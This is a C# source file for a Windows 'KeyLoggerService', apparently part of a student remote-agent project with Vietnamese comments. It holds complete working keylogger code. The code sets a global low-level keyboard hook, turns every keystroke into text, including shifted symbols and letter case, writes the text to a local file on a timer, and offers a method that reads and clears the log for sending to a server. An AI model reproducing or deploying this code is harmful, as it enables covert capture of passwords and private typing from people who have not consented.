using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace WindowsAgent
{
    public class KeyLoggerService
    {
        // Cấu hình đường dẫn file log
        private static string logPath = "fileKeyLog.txt";
        // Dùng StringBuilder làm bộ đệm để xử lý Backspace thông minh
        private static StringBuilder _buffer = new StringBuilder();
        // Các biến hook
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        
        // Trạng thái phím
        private static bool isShift = false;
        private static bool isCaps = false;

        // Thread chạy hook
        private Thread hookThread;

        // --- PUBLIC METHODS (Giao tiếp với bên ngoài) ---
        private System.Windows.Forms.Timer _saveTimer;

        public void Start()
        {
            if (hookThread != null && hookThread.IsAlive) return; // Đang chạy rồi thì thôi

            hookThread = new Thread(() =>
            {
                _hookID = SetHook(_proc);
                System.Windows.Forms.Application.Run(); // Tạo vòng lặp tin nhắn để giữ Hook hoạt động
                UnhookWindowsHookEx(_hookID);
            });

            hookThread.IsBackground = true;
            hookThread.SetApartmentState(ApartmentState.STA);
            hookThread.Start();

            _saveTimer = new System.Windows.Forms.Timer();
            _saveTimer.Interval = 5000; 
            _saveTimer.Tick += (s, e) => SaveBufferToFile();
            _saveTimer.Start();
        }

        public void Stop()
        {
            if (_hookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookID);
                _hookID = IntPtr.Zero;
            }
            if (hookThread != null)
            {
                // Ép thread dừng lại (Cách đơn giản cho đồ án)
                try { hookThread.Abort(); } catch { }
                hookThread = null;
            }
        }

        // Hàm đọc log và xóa nội dung cũ (Để gửi về Server)
        public string GetLogs()
        {
            try
            {
                string content = File.ReadAllText(logPath);
                File.WriteAllText(logPath, ""); // Xóa sau khi đọc
                return content;
            }
            catch (Exception ex)
            {
                return "Error reading log: " + ex.Message;
            }
        }

        // --- PRIVATE METHODS (Xử lý kỹ thuật Hook Windows) ---

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                // Xử lý Shift & Capslock
                if (key == Keys.LShiftKey || key == Keys.RShiftKey) isShift = true;
                if (key == Keys.Capital) isCaps = !isCaps;

                // Ghi vào file
                LogKey(key);
                
                // Reset Shift sau khi nhấn 1 phím khác (logic đơn giản)
                if (key != Keys.LShiftKey && key != Keys.RShiftKey) isShift = false;
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        // Hàm xử lý phím thông minh
        // --- ĐẶT TRONG CLASS KeyLoggerService ---

    private static void LogKey(Keys key)
    {
        // 1. XỬ LÝ PHÍM ĐẶC BIỆT (XÓA, XUỐNG DÒNG)
        if (key == Keys.Back)
        {
            if (_buffer.Length > 0) _buffer.Length--; // Xóa ký tự cuối trong bộ nhớ
            return;
        }
        if (key == Keys.Enter || key == Keys.Return)
        {
            _buffer.Append(" [Enter]<br>"); // Xuống dòng
            return;
        }
        if (key == Keys.Space)
        {
            _buffer.Append(" ");
            return;
        }
        if (key == Keys.Tab)
        {
            _buffer.Append(" [TAB] ");
            return;
        }

        // 2. BỎ QUA CÁC PHÍM CHỨC NĂNG KHÔNG GHI LOG
        // (Shift và CapsLock đã được xử lý logic ở HookCallback để bật tắt cờ isShift/isCaps)
        if (key == Keys.LShiftKey || key == Keys.RShiftKey ||
            key == Keys.LControlKey || key == Keys.RControlKey ||
            key == Keys.LMenu || key == Keys.RMenu ||
            key == Keys.LWin || key == Keys.RWin ||
            key == Keys.Capital || key == Keys.Apps)
        {
            return;
        }

        // 3. XỬ LÝ KÝ TỰ VÀ SỐ (FULL LAYOUT)
        string charKey = "";

        switch (key)
        {
            // --- HÀNG PHÍM SỐ (TOP ROW NUMBERS) ---
            case Keys.D0: charKey = isShift ? ")" : "0"; break;
            case Keys.D1: charKey = isShift ? "!" : "1"; break;
            case Keys.D2: charKey = isShift ? "@" : "2"; break;
            case Keys.D3: charKey = isShift ? "#" : "3"; break;
            case Keys.D4: charKey = isShift ? "$" : "4"; break;
            case Keys.D5: charKey = isShift ? "%" : "5"; break;
            case Keys.D6: charKey = isShift ? "^" : "6"; break;
            case Keys.D7: charKey = isShift ? "&" : "7"; break;
            case Keys.D8: charKey = isShift ? "*" : "8"; break;
            case Keys.D9: charKey = isShift ? "(" : "9"; break;

            // --- CÁC PHÍM DẤU CÂU (OEM KEYS - US LAYOUT) ---
            case Keys.Oemtilde:         charKey = isShift ? "~" : "`"; break;
            case Keys.OemMinus:         charKey = isShift ? "_" : "-"; break;
            case Keys.Oemplus:          charKey = isShift ? "+" : "="; break; // Phím dấu bằng/cộng
            case Keys.OemOpenBrackets:  charKey = isShift ? "{" : "["; break;
            case Keys.OemCloseBrackets: charKey = isShift ? "}" : "]"; break;
            case Keys.OemPipe:          charKey = isShift ? "|" : "\\"; break; // Phím gạch chéo ngược
            case Keys.OemSemicolon:     charKey = isShift ? ":" : ";"; break;
            case Keys.OemQuotes:        charKey = isShift ? "\"" : "'"; break; // Dấu nháy đơn/kép
            case Keys.Oemcomma:         charKey = isShift ? "<" : ","; break;
            case Keys.OemPeriod:        charKey = isShift ? ">" : "."; break;
            case Keys.OemQuestion:      charKey = isShift ? "?" : "/"; break;

            // --- BÀN PHÍM SỐ PHỤ (NUMPAD) ---
            case Keys.NumPad0: charKey = "0"; break;
            case Keys.NumPad1: charKey = "1"; break;
            case Keys.NumPad2: charKey = "2"; break;
            case Keys.NumPad3: charKey = "3"; break;
            case Keys.NumPad4: charKey = "4"; break;
            case Keys.NumPad5: charKey = "5"; break;
            case Keys.NumPad6: charKey = "6"; break;
            case Keys.NumPad7: charKey = "7"; break;
            case Keys.NumPad8: charKey = "8"; break;
            case Keys.NumPad9: charKey = "9"; break;
            case Keys.Add:      charKey = "+"; break;
            case Keys.Subtract: charKey = "-"; break;
            case Keys.Multiply: charKey = "*"; break;
            case Keys.Divide:   charKey = "/"; break;
            case Keys.Decimal:  charKey = "."; break;

            // --- CÁC PHÍM ĐIỀU HƯỚNG & CHỨC NĂNG (Ghi dạng thẻ [TAG]) ---
            case Keys.Escape:   charKey = " [ESC] "; break;
            case Keys.Delete:   charKey = " [DEL] "; break;
            case Keys.Home:     charKey = " [HOME] "; break;
            case Keys.End:      charKey = " [END] "; break;
            case Keys.PageUp:   charKey = " [PGUP] "; break;
            case Keys.PageDown: charKey = " [PGDN] "; break;
            case Keys.Left:     charKey = " [LEFT] "; break;
            case Keys.Right:    charKey = " [RIGHT] "; break;
            case Keys.Up:       charKey = " [UP] "; break;
            case Keys.Down:     charKey = " [DOWN] "; break;
            case Keys.PrintScreen: charKey = " [PRTSC] "; break;

            // Hàng phím F1-F12
            case Keys.F1: charKey = " [F1] "; break;
            case Keys.F2: charKey = " [F2] "; break;
            case Keys.F3: charKey = " [F3] "; break;
            case Keys.F4: charKey = " [F4] "; break;
            case Keys.F5: charKey = " [F5] "; break;
            case Keys.F6: charKey = " [F6] "; break;
            case Keys.F7: charKey = " [F7] "; break;
            case Keys.F8: charKey = " [F8] "; break;
            case Keys.F9: charKey = " [F9] "; break;
            case Keys.F10: charKey = " [F10] "; break;
            case Keys.F11: charKey = " [F11] "; break;
            case Keys.F12: charKey = " [F12] "; break;

            // --- MẶC ĐỊNH (CHỮ CÁI A-Z) ---
            default:
                charKey = key.ToString();
                // Nếu là chữ cái đơn (A-Z) thì xử lý Capslock/Shift
                if (charKey.Length == 1)
                {
                    // Logic: Nếu (Shift BẬT) KHÁC VỚI (Capslock BẬT) thì viết hoa
                    // Ví dụ: Shift tắt, Caps bật -> Hoa
                    // Shift bật, Caps tắt -> Hoa
                    // Shift bật, Caps bật -> Thường
                    bool isUpperCase = isShift ^ isCaps;
                    if (!isUpperCase) charKey = charKey.ToLower();
                }
                // Nếu là phím lạ quá dài (ví dụ MediaPlayPause) thì bỏ qua hoặc ghi log dạng [Key]
                else if (charKey.Length > 1) 
                {
                    // Tùy chọn: Có thể bỏ qua để log sạch hơn
                    // charKey = "[" + charKey + "]"; 
                    charKey = ""; 
                }
                break;
        }

        // 4. GHI VÀO BUFFER
        if (!string.IsNullOrEmpty(charKey))
        {
            _buffer.Append(charKey);
        }
        }

        private void SaveBufferToFile()
        {
            if (_buffer.Length > 0)
            {
                try
                {
                    // Ghi nối tiếp vào file
                    File.AppendAllText(logPath, _buffer.ToString());
                    // Xóa bộ đệm sau khi ghi xong
                    _buffer.Clear();
                }
                catch { }
            }
        }

        // --- DLL IMPORTS ---
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}